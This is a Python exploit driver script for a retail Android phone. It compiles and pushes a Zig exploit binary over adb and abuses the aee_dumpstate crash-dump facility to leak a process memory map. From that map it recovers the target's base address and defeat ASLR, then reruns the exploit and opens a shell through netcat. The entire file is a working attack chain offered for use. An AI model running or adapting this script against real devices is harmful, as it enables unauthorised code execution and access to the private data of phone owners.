#!/usr/bin/env python3
import sys
import os
import time
import pathlib
import subprocess
import re
import shutil

# Pwn the vulnerable binary in vuln extracted from a retail phone
TMP = 'tmp'
SRC = 'src'
TOOLS = 'tools'
EXTRACTDB = 'extractdb.py'
DBZIP = 'CURRENT.dbg'
DBUNPACK = 'CURRENT'
MAIN = 'main'

# Certain banners to parse for variables
STABLE_BANNER = b'>>>>>>>>'
LEAKDB_BANNER_REGEX = STABLE_BANNER + b' DUMP SUCCESSFUL \\((.*)\\)'

def zigbuild(cmddir):
    mainzig = os.path.join(cmddir, SRC, 'main.zig')
    outputbin = os.path.join(cmddir, TMP, MAIN)
    try:
        os.mkdir(os.path.join(cmddir, TMP))
    except FileExistsError:
        pass
    zigargs = ['zig', 'build-exe', mainzig, '-target', 'arm-linux-android', f'-femit-bin={outputbin}']
    subprocess.run(zigargs)
    return outputbin

def pushexploiter(localbin):
    remotebin = f'/data/local/tmp/{MAIN}'
    subprocess.run(['adb', 'push', localbin, remotebin])
    return remotebin

def leakdb(remotebin, pkgname, worker):
    proc = subprocess.run(['adb', 'shell', remotebin, pkgname, '0', str(worker)], capture_output=True)
    matches = re.search(LEAKDB_BANNER_REGEX, proc.stderr)
    return b'' if matches is None else matches.group(1)

def pulldb(tmpdir, leaked):
    RETRIES = 60
    print('Waiting for aee_dumpstate to complete its work... This should take about 10 seconds.')
    for i in range(RETRIES):
        # When pgrep fails to find aee_dumpstate, we know it has finished
        try:
            subprocess.run(['adb', 'shell', 'sh', '-c', 'ps -A | grep aee_dumpstate'], check=True)
            time.sleep(1)
        except subprocess.CalledProcessError:
            break
    if i == RETRIES:
        raise RuntimeError('aee_dumpstate failed to complete after one minute!')
    subprocess.run(['adb', 'pull', f'{leaked.decode()}/{DBZIP}', os.path.join(tmpdir, DBZIP)])
    subprocess.run(['adb', 'shell', 'rm', '-rf', leaked.decode()])

def extractdb(tmpdir, toolsdir):
    print('Extracting database...')
    shutil.rmtree(os.path.join(tmpdir, DBUNPACK), ignore_errors=True)
    subprocess.run([os.path.join(toolsdir, EXTRACTDB), os.path.join(tmpdir, DBZIP), os.path.join(tmpdir, DBUNPACK)])
    print('Done!')

def extractbase(unpacked):
    with open(f'{unpacked}/PROCESS_MAPS') as fp:
        baseaddr = fp.readline()
        baseaddr = int(baseaddr[:baseaddr.find('-')], 16)
        return baseaddr

def getshell(remotebin, pkgname, base, worker):
    subprocess.run(['adb', 'shell', remotebin, pkgname, str(base), str(worker)])
    subprocess.run(['adb', 'shell', 'rm', remotebin])
    print('----------------- STARTING SHELL NOW! -----------------------')
    time.sleep(0.25)
    print('# ', end='', flush=True)
    subprocess.run(['adb', 'shell', 'nc', '-U', "''"])

def main():
    cmdname = sys.argv[0]
    if len(sys.argv) < 2:
        print(f'Usage: {cmdname} <PkgName> [WorkerNum]')
        sys.exit(1)
    worker = 0 if len(sys.argv) < 3 else int(sys.argv[2])
    pkgname = sys.argv[1]
    cmddir = pathlib.Path(os.path.realpath(cmdname)).parent
    tmpdir = os.path.join(cmddir, TMP)
    toolsdir = os.path.join(cmddir, TOOLS)
    os.chdir(cmddir)
    outbin = zigbuild(cmddir)
    remotebin = pushexploiter(outbin)
    try:
        db = leakdb(remotebin, pkgname, worker)
        if db != b'':
            print('Database:', db.decode())
            pulldb(tmpdir, db)
        else:
            raise RuntimeError('Exploit was unable to create database on sdcard!')
    except Exception as e:
        print('Exception raised while leaking and extracting database!', file=sys.stderr)
        print('Database is probably still on /sdcard/db.*', file=sys.stderr)
        print('Don\'t forget to clean it up!', file=sys.stderr)
        raise e
    extractdb(tmpdir, toolsdir)
    base = extractbase(os.path.join(tmpdir, DBUNPACK))
    getshell(remotebin, pkgname, base, worker)

if __name__ == '__main__':
    main()
